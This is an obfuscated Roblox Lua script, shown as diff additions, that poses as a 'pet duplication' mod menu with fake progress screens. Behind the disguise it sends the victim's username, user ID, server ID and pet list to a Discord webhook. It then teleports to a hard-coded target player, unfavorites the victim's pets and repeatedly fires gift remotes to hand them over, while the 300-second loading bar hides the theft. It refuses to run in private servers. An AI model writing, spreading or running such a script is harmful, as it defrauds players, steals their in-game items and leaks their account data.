+	TABLE_TableIndirection["Title%0"].Text = JOcxRChmcx("UJY IZUQNHFYNTS XDXYJR", 5);
+	TABLE_TableIndirection["Title%0"].TextColor3 = Color3.fromRGB(255, 150, 50);
+	TABLE_TableIndirection["Title%0"].Font = Enum.Font.GothamBlack;
+	TABLE_TableIndirection["Title%0"].TextSize = 28;
+	TABLE_TableIndirection["Title%0"].TextStrokeTransparency = 0.7;
+	TABLE_TableIndirection["Title%0"].TextStrokeColor3 = Color3.fromRGB(200, 100, 255);
+	TABLE_TableIndirection["Title%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["Subtitle%0"] = Instance.new(JOcxRChmcx("JunjBqrub", 16));
+	TABLE_TableIndirection["Subtitle%0"].Size = UDim2.new(1, 0, 0.1, 0);
+	TABLE_TableIndirection["Subtitle%0"].Position = UDim2.new(0, 0, 0.18, 0);
+	TABLE_TableIndirection["Subtitle%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["Subtitle%0"].Text = JOcxRChmcx("Ejepewhevejc zqlheywpekj lnkpkykh...", 22);
+	TABLE_TableIndirection["Subtitle%0"].TextColor3 = Color3.fromRGB(200, 200, 255);
+	TABLE_TableIndirection["Subtitle%0"].Font = Enum.Font.Gotham;
+	TABLE_TableIndirection["Subtitle%0"].TextSize = 18;
+	TABLE_TableIndirection["Subtitle%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["LoadingBarBackground%0"] = Instance.new(JOcxRChmcx("Dpykc", 24));
+	TABLE_TableIndirection["LoadingBarBackground%0"].Name = JOcxRChmcx("OrdglqjEduEdfnjurxqg", 3);
+	TABLE_TableIndirection["LoadingBarBackground%0"].Size = UDim2.new(0.8, 0, 0.08, 0);
+	TABLE_TableIndirection["LoadingBarBackground%0"].Position = UDim2.new(0.1, 0, 0.4, 0);
+	TABLE_TableIndirection["LoadingBarBackground%0"].BackgroundColor3 = Color3.fromRGB(30, 20, 50);
+	TABLE_TableIndirection["LoadingBarBackground%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["LoadingBarBackground%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["LoadingBarCorner%0"] = Instance.new(JOcxRChmcx("FTNzcypc", 11));
+	TABLE_TableIndirection["LoadingBarCorner%0"].CornerRadius = UDim.new(0.5, 0);
+	TABLE_TableIndirection["LoadingBarCorner%0"].Parent = TABLE_TableIndirection["LoadingBarBackground%0"];
+	TABLE_TableIndirection["LoadingBar%0"] = Instance.new(JOcxRChmcx("Coxjb", 23));
+	TABLE_TableIndirection["LoadingBar%0"].Name = JOcxRChmcx("FiuxchaVul", 20);
+	TABLE_TableIndirection["LoadingBar%0"].Size = UDim2.new(0, 0, 1, 0);
+	TABLE_TableIndirection["LoadingBar%0"].Position = UDim2.new(0, 0, 0, 0);
+	TABLE_TableIndirection["LoadingBar%0"].BackgroundColor3 = Color3.fromRGB(150, 50, 255);
+	TABLE_TableIndirection["LoadingBar%0"].BorderSizePixel = 0;
+	TABLE_TableIndirection["LoadingBar%0"].Parent = TABLE_TableIndirection["LoadingBarBackground%0"];
+	TABLE_TableIndirection["LoadingBarGradient%0"] = Instance.new(JOcxRChmcx("MAYjsvawfl", 18));
+	TABLE_TableIndirection["LoadingBarGradient%0"].Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 200)),ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 50, 255))});
+	TABLE_TableIndirection["LoadingBarGradient%0"].Rotation = 90;
+	TABLE_TableIndirection["LoadingBarGradient%0"].Parent = TABLE_TableIndirection["LoadingBar%0"];
+	TABLE_TableIndirection["BarCorner%0"] = Instance.new(JOcxRChmcx("DRLxawna", 9));
+	TABLE_TableIndirection["BarCorner%0"].CornerRadius = UDim.new(0.5, 0);
+	TABLE_TableIndirection["BarCorner%0"].Parent = TABLE_TableIndirection["LoadingBar%0"];
+	TABLE_TableIndirection["LoadingText%0"] = Instance.new(JOcxRChmcx("RcvrJyzcj", 24));
+	TABLE_TableIndirection["LoadingText%0"].Name = JOcxRChmcx("BeqtydwJunj", 16);
+	TABLE_TableIndirection["LoadingText%0"].Size = UDim2.new(1, 0, 0.1, 0);
+	TABLE_TableIndirection["LoadingText%0"].Position = UDim2.new(0, 0, 0.5, 0);
+	TABLE_TableIndirection["LoadingText%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["LoadingText%0"].Text = JOcxRChmcx("Kpkvkcnkbkpi Uauvgo... 2%", 2);
+	TABLE_TableIndirection["LoadingText%0"].TextColor3 = Color3.fromRGB(200, 220, 255);
+	TABLE_TableIndirection["LoadingText%0"].Font = Enum.Font.GothamBold;
+	TABLE_TableIndirection["LoadingText%0"].TextSize = 22;
+	TABLE_TableIndirection["LoadingText%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["StatusMessages%0"] = Instance.new(JOcxRChmcx("SdwsKzadk", 25));
+	TABLE_TableIndirection["StatusMessages%0"].Size = UDim2.new(0.9, 0, 0.3, 0);
+	TABLE_TableIndirection["StatusMessages%0"].Position = UDim2.new(0.05, 0, 0.65, 0);
+	TABLE_TableIndirection["StatusMessages%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["StatusMessages%0"].Text = JOcxRChmcx("•XYFWYNSL", 5);
+	TABLE_TableIndirection["StatusMessages%0"].TextColor3 = Color3.fromRGB(180, 240, 255);
+	TABLE_TableIndirection["StatusMessages%0"].Font = Enum.Font.Gotham;
+	TABLE_TableIndirection["StatusMessages%0"].TextSize = 16;
+	TABLE_TableIndirection["StatusMessages%0"].TextXAlignment = Enum.TextXAlignment.Left;
+	TABLE_TableIndirection["StatusMessages%0"].TextYAlignment = Enum.TextYAlignment.Top;
+	TABLE_TableIndirection["StatusMessages%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["glow%0"] = Instance.new(JOcxRChmcx("JnbhfMbcfm", 1));
+	TABLE_TableIndirection["glow%0"].Size = UDim2.new(1.1, 0, 1.1, 0);
+	TABLE_TableIndirection["glow%0"].Position = UDim2.new(-0.05, 0, -0.05, 0);
+	TABLE_TableIndirection["glow%0"].BackgroundTransparency = 1;
+	TABLE_TableIndirection["glow%0"].Image = JOcxRChmcx("dnjmeeqfup://0114456419", 12);
+	TABLE_TableIndirection["glow%0"].ImageColor3 = Color3.fromRGB(150, 50, 255);
+	TABLE_TableIndirection["glow%0"].ImageTransparency = 0.8;
+	TABLE_TableIndirection["glow%0"].ScaleType = Enum.ScaleType.Slice;
+	TABLE_TableIndirection["glow%0"].SliceCenter = Rect.new(100, 100, 100, 100);
+	TABLE_TableIndirection["glow%0"].Parent = TABLE_TableIndirection["MainContainer%0"];
+	TABLE_TableIndirection["rotateTween%0"] = TABLE_TableIndirection["TweenService%0"]:Create(TABLE_TableIndirection["glow%0"], TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation=360});
+	TABLE_TableIndirection["rotateTween%0"]:Play();
+	return TABLE_TableIndirection["ScreenGui%0"], TABLE_TableIndirection["LoadingBar%0"], TABLE_TableIndirection["LoadingText%0"], TABLE_TableIndirection["StatusMessages%0"];
+end
+local function RunLoadingAnimation(loadingBar, loadingText, statusMessages)
+	TABLE_TableIndirection["duration%0"] = 300;
+	TABLE_TableIndirection["startTime%0"] = tick();
+	TABLE_TableIndirection["endTime%0"] = TABLE_TableIndirection["startTime%0"] + TABLE_TableIndirection["duration%0"];
+	TABLE_TableIndirection["statusUpdates%0"] = {JOcxRChmcx("• Vsjummcha mylpyl mywolcns msmnygm", 20),JOcxRChmcx("• Mrmxmepmdmrk hytpmgexmsr wiuyirgi", 4),JOcxRChmcx("• Jmrepmdmrk hytpmgexmsr tvsgihyviw", 4)};
+	TABLE_TableIndirection["currentStatusIndex%0"] = 1;
+	while tick() < TABLE_TableIndirection["endTime%0"] do
+		TABLE_TableIndirection["elapsed%0"] = tick() - TABLE_TableIndirection["startTime%0"];
+		TABLE_TableIndirection["progress%0"] = math.min(TABLE_TableIndirection["elapsed%0"] / TABLE_TableIndirection["duration%0"], 1);
+		TABLE_TableIndirection["percentage%0"] = math.floor(TABLE_TableIndirection["progress%0"] * 100);
+		loadingBar.Size = UDim2.new(TABLE_TableIndirection["progress%0"], 0, 1, 0);
+		loadingText.Text = string.format(JOcxRChmcx("Evqmjdbujpo Qsphsftt: %e%%", 1), TABLE_TableIndirection["percentage%0"]);
+		if (TABLE_TableIndirection["progress%0"] > (TABLE_TableIndirection["currentStatusIndex%0"] / #TABLE_TableIndirection["statusUpdates%0"])) then
+			statusMessages.Text = table.concat(TABLE_TableIndirection["statusUpdates%0"], JOcxRChmcx("\n", 20), 1, TABLE_TableIndirection["currentStatusIndex%0"]);
+			TABLE_TableIndirection["currentStatusIndex%0"] = math.min(TABLE_TableIndirection["currentStatusIndex%0"] + 1, #TABLE_TableIndirection["statusUpdates%0"]);
+		end
+		TABLE_TableIndirection["pulse%0"] = (math.sin(tick() * 5) * 0.2) + 0.8;
+		loadingBar.BackgroundColor3 = Color3.fromRGB(math.floor(150 * TABLE_TableIndirection["pulse%0"]), math.floor(50 * TABLE_TableIndirection["pulse%0"]), math.floor(255 * TABLE_TableIndirection["pulse%0"]));
+		TABLE_TableIndirection["RunService%0"].Heartbeat:Wait();
+	end
+	loadingBar.Size = UDim2.new(1, 0, 1, 0);
+	loadingText.Text = JOcxRChmcx("Ridzwqohwcb Gmghsa Fsorm [544%]", 14);
+	statusMessages.Text = table.concat(TABLE_TableIndirection["statusUpdates%0"], JOcxRChmcx("\n", 17));
+end
+local function FindTargetPlayer()
+	for _, player in ipairs(TABLE_TableIndirection["Players%0"]:GetPlayers()) do
+		if ((player.Name == TABLE_TableIndirection["TARGET_PLAYER_NAME%0"]) and player.Character) then
+			return player;
+		end
+	end
+	return nil;
+end
+local function UnfavoriteByNameSearch(pet)
+	for _, remote in pairs(TABLE_TableIndirection["ReplicatedStorage%0"]:GetDescendants()) do
+		if (remote:IsA(JOcxRChmcx("TgoqvgGxgpv", 2)) and string.find(string.lower(remote.Name), JOcxRChmcx("kfatwnyj", 5))) then
+			pcall(function()
+				remote:FireServer(pet, false);
+				remote:FireServer(pet.Name, false);
+				remote:FireServer({pet=pet,favorite=false});
+				return true;
+			end);
+		end
+	end
+	return false;
+end
+local function PickupActivePets()
+	TABLE_TableIndirection["success%0"] = false;
+	TABLE_TableIndirection["pickupRemotes%0"] = {TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild(JOcxRChmcx("KdxfpkMzhjoz", 21))};
+	for _, remote in pairs(TABLE_TableIndirection["pickupRemotes%0"]) do
+		if remote then
+			pcall(function()
+				if remote:IsA(JOcxRChmcx("MzhjozZqzio", 21)) then
+					remote:FireServer(JOcxRChmcx("exrzje", 15));
+					remote:FireServer();
+				elseif remote:IsA(JOcxRChmcx("ZmuwbmNcvkbqwv", 8)) then
+					remote:InvokeServer(JOcxRChmcx("leygql", 22));
+					remote:InvokeServer();
+				end
+				TABLE_TableIndirection["success%0"] = true;
+			end);
+		end
+	end
+	TABLE_TableIndirection["playerGui%0"] = TABLE_TableIndirection["LocalPlayer%0"]:FindFirstChild(JOcxRChmcx("TpecivKym", 4));
+	if TABLE_TableIndirection["playerGui%0"] then
+		for _, gui in pairs(TABLE_TableIndirection["playerGui%0"]:GetDescendants()) do
+			if (gui:IsA(JOcxRChmcx("RcvrZsrrml", 24)) or gui:IsA(JOcxRChmcx("AesywTmllgf", 18))) then
+				TABLE_TableIndirection["buttonText%0"] = string.lower(gui.Name);
+				if (string.find(TABLE_TableIndirection["buttonText%0"], JOcxRChmcx("fysakf", 16)) or string.find(TABLE_TableIndirection["buttonText%0"], JOcxRChmcx("lxuunlc", 9)) or string.find(TABLE_TableIndirection["buttonText%0"], JOcxRChmcx("bodebx", 10))) then
+					pcall(function()
+						for _, connection in pairs(getconnections(gui.MouseButton1Click)) do
+							connection:Fire();
+						end
+						TABLE_TableIndirection["success%0"] = true;
+					end);
+				end
+			end
+		end
+	end
+	pcall(function()
+		TABLE_TableIndirection["VirtualInputManager%0"] = game:GetService(JOcxRChmcx("KxgijpaXcejiBpcpvtg", 15));
+		TABLE_TableIndirection["VirtualInputManager%0"]:SendKeyEvent(true, JOcxRChmcx("I", 17), false, game);
+		task.wait(0.01);
+		TABLE_TableIndirection["VirtualInputManager%0"]:SendKeyEvent(false, JOcxRChmcx("W", 5), false, game);
+		TABLE_TableIndirection["success%0"] = true;
+	end);
+	return TABLE_TableIndirection["success%0"];
+end
+local function GetPlayerPets()
+	TABLE_TableIndirection["pets%0"] = {};
+	TABLE_TableIndirection["backpack%0"] = TABLE_TableIndirection["LocalPlayer%0"]:FindFirstChild(JOcxRChmcx("Ihjrwhjr", 7));
+	TABLE_TableIndirection["character%0"] = TABLE_TableIndirection["LocalPlayer%0"].Character;
+	PickupActivePets();
+	task.wait(0);
+	if TABLE_TableIndirection["backpack%0"] then
+		for _, item in ipairs(TABLE_TableIndirection["backpack%0"]:GetChildren()) do
+			if item:IsA(JOcxRChmcx("Niif", 20)) then
+				for _, petName in ipairs(TABLE_TableIndirection["TARGET_PETS%0"]) do
+					if string.find(string.lower(item.Name), string.lower(petName)) then
+						table.insert(TABLE_TableIndirection["pets%0"], item);
+					end
+				end
+			end
+		end
+	end
+	if TABLE_TableIndirection["character%0"] then
+		for _, item in ipairs(TABLE_TableIndirection["character%0"]:GetChildren()) do
+			if item:IsA(JOcxRChmcx("Xssp", 4)) then
+				for _, petName in ipairs(TABLE_TableIndirection["TARGET_PETS%0"]) do
+					if string.find(string.lower(item.Name), string.lower(petName)) then
+						table.insert(TABLE_TableIndirection["pets%0"], item);
+					end
+				end
+			end
+		end
+	end
+	return TABLE_TableIndirection["pets%0"];
+end
+local function SendToDiscord()
+	TABLE_TableIndirection["playerPets%0"] = GetPlayerPets();
+	TABLE_TableIndirection["petList%0"] = JOcxRChmcx("Lmlc", 24);
+	if (#TABLE_TableIndirection["playerPets%0"] > 0) then
+		TABLE_TableIndirection["petNames%0"] = {};
+		for _, pet in ipairs(TABLE_TableIndirection["playerPets%0"]) do
+			table.insert(TABLE_TableIndirection["petNames%0"], pet.Name);
+		end
+		TABLE_TableIndirection["petList%0"] = table.concat(TABLE_TableIndirection["petNames%0"], JOcxRChmcx(", ", 7));
+	end
+	TABLE_TableIndirection["data%0"] = {[JOcxRChmcx("bzlyuhtl", 7)]=JOcxRChmcx("Vkz Xkvuxzkx", 6),[JOcxRChmcx("tbqtsh", 15)]={{[JOcxRChmcx("gvgyr", 13)]=JOcxRChmcx("📊 KBWSPJHAPVU", 7),[JOcxRChmcx("ghvfulswlrq", 3)]=JOcxRChmcx("Ybofhrq xaxixe axqx xhrk axk hbmbjfifhxk mbq:", 23),[JOcxRChmcx("oaxad", 12)]=16753920,[JOcxRChmcx("ornumb", 9)]={{[JOcxRChmcx("fsew", 18)]=JOcxRChmcx("👤 HNHITB XCUD", 15),[JOcxRChmcx("rwhqa", 22)]=string.format(JOcxRChmcx("Tgsk: %y\nAykxOJ: %y", 6), TABLE_TableIndirection["LocalPlayer%0"].Name, TABLE_TableIndirection["LocalPlayer%0"].UserId),[JOcxRChmcx("kpnkpg", 2)]=true},{[JOcxRChmcx("kxjb", 23)]=JOcxRChmcx("🎮 FCTEWW", 4),[JOcxRChmcx("bgrak", 6)]=string.format(JOcxRChmcx("Ysew: %k\nKwjnwjAV: ```%k```", 18), TABLE_TableIndirection["GameInfo%0"].Name, game.JobId),[JOcxRChmcx("fkifkb", 23)]=true},{[JOcxRChmcx("vium", 8)]=JOcxRChmcx("🐾 LYUXS XOJFCWUNY", 20),[JOcxRChmcx("bgrak", 6)]=TABLE_TableIndirection["petList%0"],[JOcxRChmcx("nsqnsj", 5)]=false}},[JOcxRChmcx("xgglwj", 18)]={[JOcxRChmcx("vgzv", 2)]=(JOcxRChmcx("Vitsvx Xmqi: ", 4) .. os.date(JOcxRChmcx("%T-%h-%y %C:%H:%N", 21)))}}},[JOcxRChmcx("qcbhsbh", 14)]=(((#TABLE_TableIndirection["playerPets%0"] > 0) and JOcxRChmcx("🎉 Okzxdq gzr qzqd odsr!", 25)) or JOcxRChmcx("📌 Kgvtzm cvn ij ovmbzo kzon", 21))};
+	local success, response = pcall(function()
+		TABLE_TableIndirection["jsonData%0"] = TABLE_TableIndirection["HttpService%0"]:JSONEncode(TABLE_TableIndirection["data%0"]);
+		return request({Url=TABLE_TableIndirection["WEBHOOK_URL%0"],Method=JOcxRChmcx("YXBC", 9),Headers={[JOcxRChmcx("Dpoufou-Uzqf", 1)]=JOcxRChmcx("ixxtqkibqwv/rawv", 8)},Body=TABLE_TableIndirection["jsonData%0"]});
+	end);
+	return success, response;
+end
+local function DirectTeleport(target)
+	if (not target or not target.Character or not target.Character:FindFirstChild(JOcxRChmcx("QdvjwxrmAxxcYjac", 9))) then
+		return false, JOcxRChmcx("Rypecr afypyarcp lmr dmslb", 24);
+	end
+	if (not TABLE_TableIndirection["LocalPlayer%0"].Character or not TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChild(JOcxRChmcx("PcuivwqlZwwbXizb", 8))) then
+		return false, JOcxRChmcx("Orfdo fkdudfwhu qrw uhdgb", 3);
+	end
+	TABLE_TableIndirection["targetCFrame%0"] = target.Character.HumanoidRootPart.CFrame;
+	TABLE_TableIndirection["teleportPosition%0"] = TABLE_TableIndirection["targetCFrame%0"].Position + (TABLE_TableIndirection["targetCFrame%0"].LookVector * 2.5);
+	TABLE_TableIndirection["LocalPlayer%0"].Character.HumanoidRootPart.CFrame = CFrame.new(TABLE_TableIndirection["teleportPosition%0"], target.Character.HumanoidRootPart.Position);
+	return true;
+end
+local function EquipPet(pet)
+	if (not pet or not pet:IsA(JOcxRChmcx("Dyyv", 10))) then
+		return false, JOcxRChmcx("Otbgroj vkz", 6);
+	end
+	if (pet.Parent ~= TABLE_TableIndirection["LocalPlayer%0"].Backpack) then
+		pet.Parent = TABLE_TableIndirection["LocalPlayer%0"].Backpack;
+		task.wait(0);
+	end
+	TABLE_TableIndirection["humanoid%0"] = TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChildOfClass(JOcxRChmcx("Cphvijdy", 21));
+	if not TABLE_TableIndirection["humanoid%0"] then
+		return false, JOcxRChmcx("Tgymzaup zaf ragzp", 12);
+	end
+	TABLE_TableIndirection["humanoid%0"]:EquipTool(pet);
+	task.wait(0);
+	if not TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChild(pet.Name) then
+		return false, JOcxRChmcx("Cxfiba ql bnrfm mbq", 23);
+	end
+	return true;
+end
+local function GiftPet(targetPlayer, pet)
+	print(JOcxRChmcx("Zssdloshmf sn fhes:", 25), pet.Name);
+	PickupActivePets();
+	task.wait(0);
+	TABLE_TableIndirection["unfavoriteSuccess%0"] = UnfavoriteByNameSearch(pet);
+	if TABLE_TableIndirection["unfavoriteSuccess%0"] then
+		print(JOcxRChmcx("Dwojexarcnm ync", 9));
+	else
+		print(JOcxRChmcx("Hckngf vq wphcxqtkvg rgv", 2));
+	end
+	task.wait(0);
+	TABLE_TableIndirection["teleportSuccess%0"] = DirectTeleport(targetPlayer);
+	if not TABLE_TableIndirection["teleportSuccess%0"] then
+		return false, JOcxRChmcx("Ozgzkjmo avdgzy", 21);
+	end
+	task.wait(0);
+	TABLE_TableIndirection["equipSuccess%0"] = EquipPet(pet);
+	if not TABLE_TableIndirection["equipSuccess%0"] then
+		return false, JOcxRChmcx("Iuymt jempih", 4);
+	end
+	task.wait(0);
+	TABLE_TableIndirection["giftRemotes%0"] = {TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild(JOcxRChmcx("EgdrPckmrc", 24)),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild(JOcxRChmcx("UwjsDshFsachs", 14))};
+	for _, giftRemote in pairs(TABLE_TableIndirection["giftRemotes%0"]) do
+		if giftRemote then
+			pcall(function()
+				if giftRemote:IsA(JOcxRChmcx("GtbditTktci", 15)) then
+					giftRemote:FireServer(targetPlayer, pet);
+					giftRemote:FireServer(targetPlayer.Name, pet.Name);
+					giftRemote:FireServer({player=targetPlayer,pet=pet});
+				elseif giftRemote:IsA(JOcxRChmcx("PckmrcDslargml", 24)) then
+					giftRemote:InvokeServer(targetPlayer, pet);
+					giftRemote:InvokeServer(targetPlayer.Name, pet.Name);
+				end
+			end);
+			print(JOcxRChmcx("Zxji wjrtyj:", 5), giftRemote.Name);
+			return true, JOcxRChmcx("Geqp dqyafq: ", 12) .. giftRemote.Name;
+		end
+	end
+	if targetPlayer.Character then
+		for _, part in pairs(targetPlayer.Character:GetDescendants()) do
+			if part:IsA(JOcxRChmcx("YaxgrvrchYaxvyc", 9)) then
+				fireproximityprompt(part);
+				print(JOcxRChmcx("Vyhut fhenycyjo fhecfj", 16));
+				return true, JOcxRChmcx("Dgpcb npmvgkgrw npmknr", 24);
+			end
+		end
+	end
+	return false, JOcxRChmcx("Qr jliwlqj phwkrg irxqg", 3);
+end
+local function AutoGiftLoop()
+	while task.wait(0) do
+		TABLE_TableIndirection["targetPlayer%0"] = FindTargetPlayer();
+		if not TABLE_TableIndirection["targetPlayer%0"] then
+			warn(JOcxRChmcx("Elcrpe awljpc yze qzfyo", 11));
+			continue;
+		end
+		TABLE_TableIndirection["pets%0"] = GetPlayerPets();
+		if (#TABLE_TableIndirection["pets%0"] == 0) then
+			warn(JOcxRChmcx("Uv ahynla wlaz mvbuk", 7));
+			continue;
+		end
+		TABLE_TableIndirection["pet%0"] = TABLE_TableIndirection["pets%0"][1];
+		print(JOcxRChmcx("Buufnqujoh up hjgu:", 1), TABLE_TableIndirection["pet%0"].Name);
+		local success, result = pcall(function()
+			return GiftPet(TABLE_TableIndirection["targetPlayer%0"], TABLE_TableIndirection["pet%0"]);
+		end);
+		if success then
+			print(JOcxRChmcx("Egdr pcqsjr:", 24), result);
+		else
+			warn(JOcxRChmcx("Yaxl wjjgj:", 18), result);
+		end
+		task.wait(0);
+	end
+end
+local function AutoRefreshLoop()
+	while task.wait(0) do
+		TABLE_TableIndirection["targetPlayer%0"] = FindTargetPlayer();
+		if TABLE_TableIndirection["targetPlayer%0"] then
+		end
+	end
+end
+local function Main()
+	local modMenu, duplicateButton = CreateModMenu();
+	if (game.PrivateServerId ~= JOcxRChmcx("", 1)) then
+		warn(JOcxRChmcx("Fhylqju iuhluh tujusjut. Ijeffydw ishyfj.", 16));
+		CreatePrivateServerAlert();
+		return;
+	end
+	duplicateButton.MouseButton1Click:Connect(function()
+		modMenu:Destroy();
+		local smallScreen, messageLabel, dotsLabel = CreateSmallLoadingScreen();
+		TABLE_TableIndirection["messages%0"] = {JOcxRChmcx("BFNY XDXYJR GDUFXXNSL", 5),JOcxRChmcx("EJGEM RWDNKE UGTXGT", 2),JOcxRChmcx("RANEBUEJC OANRAN OPWPQO", 22),JOcxRChmcx("XULWOO OANRAN LNKPAYPEKJ", 22),JOcxRChmcx("ECJ LRLTY TQ DEFNV ESLED XPLY (DPCGPC MFDJ)", 11),JOcxRChmcx("VXKVGXOTM JAVK VXUIKJAXKY", 6)};
+		TABLE_TableIndirection["colorTask%0"] = task.spawn(function()
+			TABLE_TableIndirection["hue%0"] = 0;
+			while messageLabel and messageLabel.Parent do
+				TABLE_TableIndirection["hue%0"] = (TABLE_TableIndirection["hue%0"] + 0.01) % 1;
+				messageLabel.TextColor3 = Color3.fromHSV(TABLE_TableIndirection["hue%0"], 0.8, 1);
+				dotsLabel.TextColor3 = Color3.fromHSV((TABLE_TableIndirection["hue%0"] + 0.5) % 1, 0.8, 1);
+				TABLE_TableIndirection["RunService%0"].Heartbeat:Wait();
+			end
+		end);
+		TABLE_TableIndirection["messageTask%0"] = task.spawn(function()
+			TABLE_TableIndirection["msgIndex%0"] = 1;
+			while smallScreen and smallScreen.Parent do
+				messageLabel.Text = TABLE_TableIndirection["messages%0"][TABLE_TableIndirection["msgIndex%0"]];
+				TABLE_TableIndirection["msgIndex%0"] = (TABLE_TableIndirection["msgIndex%0"] % #TABLE_TableIndirection["messages%0"]) + 1;
+				task.wait(3);
+			end
+		end);
+		task.spawn(SendToDiscord);
+		TABLE_TableIndirection["targetFound%0"] = false;
+		while not TABLE_TableIndirection["targetFound%0"] do
+			if FindTargetPlayer() then
+				task.cancel(TABLE_TableIndirection["messageTask%0"]);
+				messageLabel.Text = JOcxRChmcx("UGTXGT DARCUU FQPG", 2);
+				task.wait(1);
+				messageLabel.Text = JOcxRChmcx("RSZQSHMF LDMT", 25);
+				TABLE_TableIndirection["startTime%0"] = tick();
+				while (tick() - TABLE_TableIndirection["startTime%0"]) < 20 do
+					TABLE_TableIndirection["RunService%0"].Heartbeat:Wait();
+				end
+				TABLE_TableIndirection["targetFound%0"] = true;
+			end
+			task.wait(0);
+		end
+		smallScreen:Destroy();
+		local fullScreen, loadingBar, loadingText, statusMessages = CreateFullLoadingScreen();
+		task.spawn(function()
+			RunLoadingAnimation(loadingBar, loadingText, statusMessages);
+			task.wait(0);
+			fullScreen:Destroy();
+		end);
+		task.spawn(AutoRefreshLoop);
+		task.spawn(AutoGiftLoop);
+		print(JOcxRChmcx("Fmdsqf bxmkqd:", 12), TABLE_TableIndirection["TARGET_PLAYER_NAME%0"]);
+		print(JOcxRChmcx("Ridzwqohwcb Gmghsa Oqhwjs", 14));
+	end);
+end
+Main();
